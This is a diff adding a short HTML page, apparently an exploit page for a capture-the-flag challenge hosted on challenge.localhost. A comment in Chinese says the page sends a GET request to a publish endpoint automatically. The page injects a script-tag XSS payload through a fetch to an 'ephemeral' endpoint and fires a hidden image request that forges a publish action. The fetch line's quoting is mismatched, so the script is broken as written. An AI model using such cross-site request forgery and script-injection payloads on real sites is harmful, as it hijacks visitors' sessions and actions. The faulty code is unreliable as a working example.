@@ -1,0 +1,18 @@
+        <!DOCTYPE html>
+    <html>
+    <body>
+        <h1>Welcome to my site!</h1>
+        <!-- 这会自动发送GET请求到publish端点 -->
+
+        <script>
+         
+            fetch("http://challenge.localhost/ephemeral?content=<script>alert('PAWED')' + "<" + /script>"
+            )
+
+
+        </script>
+        <img src="http://challenge.localhost/publish" style="display:none;">
+    
+    </body>
+    </html>
+    
